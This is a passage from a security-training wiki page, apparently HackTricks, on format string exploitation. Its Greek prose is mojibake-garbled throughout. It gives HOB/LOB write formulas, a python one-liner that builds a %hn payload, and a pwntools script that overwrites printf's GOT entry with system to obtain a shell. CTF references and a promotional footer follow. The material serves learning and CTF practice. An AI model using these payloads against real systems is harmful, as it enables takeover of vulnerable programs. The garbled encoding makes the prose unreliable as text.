* **LOB** ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î± 2 Ï‡Î±Î¼Î·Î»ÏŒÏ„ÎµÏÎ± bytes Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î· Î¼Î¿ÏÏ†Î® Ï„Î·Ï‚ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï€ÏÏÏ„Î± Ï„Î¿ Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ¿** Î±Ï€ÏŒ \[HOB, LOB] ÎºÎ±Î¹ Î¼ÎµÏ„Î¬ Ï„Î¿ Î¬Î»Î»Î¿.

Î‘Î½ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Î‘Î½ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools Template

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± **Ï€ÏÏŒÏ„Ï…Ï€Î¿** Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î¬ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏ€Î¿ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ ÏƒÏ„Î¿:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

Î‰ Î±Ï…Ï„ÏŒ Ï„Î¿ Î²Î±ÏƒÎ¹ÎºÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [**ÎµÎ´Ï**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite):
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## Format Strings to BOF

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„Î¿ÏÎ¼Îµ Ï„Î¹Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ Î¼Î¹Î±Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Î¼Î¿ÏÏ†Î®Ï‚ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬Ï‚ Î³Î¹Î± Î½Î± **Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ ÏƒÎµ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚** ÎºÎ±Î¹ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï„ÏÏ€Î¿Ï… **buffer overflow**.

## Other Examples & References

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32 bit, no relro, no canary, nx, no pie, Î²Î±ÏƒÎ¹ÎºÎ® Ï‡ÏÎ®ÏƒÎ· Î¼Î¿ÏÏ†ÏÎ½ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÏÎ½ Î³Î¹Î± Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Î· ÏƒÎ·Î¼Î±Î¯Î± Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î± (Î´ÎµÎ½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Î· ÏÎ¿Î® ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚)
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bit, relro, no canary, nx, no pie, Î¼Î¿ÏÏ†Î® ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬Ï‚ Î³Î¹Î± Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· `fflush` Î¼Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± win (ret2win)
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32 bit, relro, no canary, nx, no pie, Î¼Î¿ÏÏ†Î® ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬Ï‚ Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ main ÏƒÏ„Î¿ `.fini_array` (Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î· ÏÎ¿Î® Î½Î± ÎµÏ€Î±Î½Î±Î»Î·Ï†Î¸ÎµÎ¯ 1 Ï†Î¿ÏÎ¬ Î±ÎºÏŒÎ¼Î±) ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î¿ `system` ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± GOT Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î¿ `strlen`. ÎŒÏ„Î±Î½ Î· ÏÎ¿Î® ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ ÏƒÏ„Î¿ main, Ï„Î¿ `strlen` ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Îµ ÎµÎ¯ÏƒÎ¿Î´Î¿ Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î¿ `system`, Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Ï€ÎµÏÎ±ÏƒÏ„ÎµÎ¯.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
